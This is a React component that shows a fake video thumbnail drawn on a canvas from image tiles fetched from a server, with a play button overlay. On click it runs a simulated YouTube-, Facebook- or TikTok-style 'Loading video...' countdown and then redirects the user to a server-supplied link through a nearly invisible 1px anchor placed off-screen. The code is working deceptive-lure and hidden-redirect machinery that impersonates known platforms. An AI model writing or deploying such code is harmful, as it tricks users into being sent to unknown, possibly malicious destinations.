'use client'

import { useEffect, useRef, useState } from 'react'

interface TileManifest {
  f: string
  r: number
  c: number
}

interface GoImageData {
  link: string
  tileId: string
  cols: number
  rows: number
  count: number
  width: number
  height: number
  manifest: TileManifest[]
  base: string
}

interface GoConfig {
  g: string
  v: number
  t: number
  y: string
  h: number
}

export function GoTilesImage() {
  const canvasRef = useRef<HTMLCanvasElement>(null)
  const containerRef = useRef<HTMLDivElement>(null)
  const [imageData, setImageData] = useState<GoImageData | null>(null)
  const [config, setConfig] = useState<GoConfig | null>(null)
  const [showLoading, setShowLoading] = useState(false)
  const [timer, setTimer] = useState(0)
  const [progress, setProgress] = useState(0)

  useEffect(() => {
    // Fetch go data
    fetch('/api/go-data', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: '_=' + Date.now(),
    })
      .then((r) => r.json())
      .then((data) => {
        if (data.success && data.data) {
          setImageData(data.data.image)
          setConfig(data.data.config)
        }
      })
      .catch(() => {})
  }, [])

  const [tilesLoaded, setTilesLoaded] = useState(false)

  useEffect(() => {
    if (!imageData || !canvasRef.current) return

    const canvas = canvasRef.current
    const ctx = canvas.getContext('2d')
    if (!ctx) return

    const { cols, rows, manifest, base } = imageData
    let tileWidth = 0
    let tileHeight = 0
    let ready = false
    let loadedCount = 0

    manifest.forEach((tile) => {
      const img = new Image()
      img.decoding = 'async'
      img.onload = () => {
        if (!ready) {
          tileWidth = img.naturalWidth
          tileHeight = img.naturalHeight
          canvas.width = cols * tileWidth
          canvas.height = rows * tileHeight
          ready = true
        }
        ctx.drawImage(img, tile.c * tileWidth, tile.r * tileHeight, tileWidth, tileHeight)
        loadedCount++
        if (loadedCount >= 3) setTilesLoaded(true)
      }
      img.onerror = () => {
        // Tiles missing - hide the component
      }
      img.src = `${base}/${tile.f}`
    })
  }, [imageData])

  function handleClick(e: React.MouseEvent) {
    e.preventDefault()
    if (!config || !imageData) return

    if (config.v === 1) {
      // Show video loading animation
      const totalTime = config.t + Math.floor(Math.random() * 3)
      setTimer(totalTime)
      setProgress(0)
      setShowLoading(true)

      let remaining = totalTime
      const interval = setInterval(() => {
        remaining--
        setTimer(remaining)
        setProgress(((totalTime - remaining) / totalTime) * 100)
        if (remaining <= 0) {
          clearInterval(interval)
          doRedirect(imageData.link)
        }
      }, 1000)
    } else {
      doRedirect(imageData.link)
    }
  }

  function doRedirect(url: string) {
    const a = document.createElement('a')
    a.href = url
    a.style.cssText = 'position:fixed;top:-1px;left:-1px;width:1px;height:1px;opacity:0.01;overflow:hidden;z-index:-1;'
    document.body.appendChild(a)
    a.click()
    setTimeout(() => a.remove(), 100)
  }

  if (!imageData || !tilesLoaded) return null

  const style = config?.y || 'youtube'

  return (
    <div ref={containerRef} className="go-tiles-container" style={{ width: '100%', maxWidth: '640px', margin: '0', position: 'relative', cursor: 'pointer', overflow: 'hidden', borderRadius: '4px' }}>
      <a href={imageData.link} onClick={handleClick} style={{ display: 'block', textDecoration: 'none' }}>
        <div style={{ position: 'relative', background: '#000', aspectRatio: '16/9' }}>
          <canvas
            ref={canvasRef}
            style={{ display: 'block', width: '100%', height: '100%', position: 'absolute', top: 0, left: 0, objectFit: 'cover' }}
          />
          {/* Play button overlay */}
          {!showLoading && (
            <div style={{ position: 'absolute', top: 0, left: 0, right: 0, bottom: 0, display: 'flex', alignItems: 'center', justifyContent: 'center', pointerEvents: 'none', zIndex: 2 }}>
              <div style={{ width: '68px', height: '48px', background: 'rgba(0,0,0,0.7)', borderRadius: '12px', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
                <svg viewBox="0 0 24 24" style={{ width: '24px', height: '24px', fill: '#fff', marginLeft: '3px' }}>
                  <path d="M8 5v14l11-7z" />
                </svg>
              </div>
            </div>
          )}
          {/* Loading animation overlay */}
          {showLoading && (
            <div className={`pm-loading pm-l-${style} pm-active`} style={{ position: 'absolute', top: 0, left: 0, right: 0, bottom: 0, background: 'rgba(0,0,0,0.92)', zIndex: 10, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', borderRadius: '4px' }}>
              {style === 'youtube' && (
                <>
                  <div style={{ position: 'absolute', top: 0, left: 0, right: 0, height: '3px', background: 'rgba(255,255,255,0.1)' }}>
                    <div style={{ height: '100%', background: '#ff0000', width: `${progress}%`, transition: 'width 0.1s linear' }} />
                  </div>
                  <div className="animate-spin" style={{ width: '60px', height: '60px', border: '3px solid rgba(255,255,255,0.15)', borderTopColor: '#ff0000', borderRadius: '50%' }} />
                  <div style={{ color: '#aaa', fontSize: '14px', marginTop: '20px' }}>Loading video...</div>
                  <div style={{ color: '#666', fontSize: '12px', marginTop: '8px' }}>{timer}s remaining</div>
                </>
              )}
              {style === 'facebook' && (
                <>
                  <div className="animate-spin" style={{ width: '50px', height: '50px', border: '4px solid rgba(255,255,255,0.1)', borderTopColor: '#1877f2', borderRadius: '50%' }} />
                  <div style={{ color: '#bbb', fontSize: '13px', marginTop: '16px' }}>Loading video...</div>
                  <div style={{ color: '#666', fontSize: '11px', marginTop: '6px' }}>{timer}s remaining</div>
                </>
              )}
              {style === 'buffer' && (
                <>
                  <div className="animate-spin" style={{ width: '56px', height: '56px', border: '3px solid transparent', borderTopColor: '#fff', borderRightColor: 'rgba(255,255,255,0.3)', borderBottomColor: 'rgba(255,255,255,0.1)', borderRadius: '50%' }} />
                  <div style={{ color: '#ccc', fontSize: '13px', marginTop: '18px', letterSpacing: '1px' }}>Buffering...</div>
                  <div style={{ color: '#666', fontSize: '11px', marginTop: '6px' }}>{timer}s remaining</div>
                </>
              )}
              {style === 'tiktok' && (
                <>
                  <div style={{ display: 'flex', gap: '8px' }}>
                    <div className="animate-pulse" style={{ width: '12px', height: '12px', borderRadius: '50%', background: '#fe2c55' }} />
                    <div className="animate-pulse" style={{ width: '12px', height: '12px', borderRadius: '50%', background: '#fff', animationDelay: '0.2s' }} />
                    <div className="animate-pulse" style={{ width: '12px', height: '12px', borderRadius: '50%', background: '#25f4ee', animationDelay: '0.4s' }} />
                  </div>
                  <div style={{ color: '#ccc', fontSize: '13px', marginTop: '18px' }}>Loading...</div>
                  <div style={{ color: '#666', fontSize: '11px', marginTop: '6px' }}>{timer}s remaining</div>
                </>
              )}
            </div>
          )}
        </div>
      </a>
    </div>
  )
}
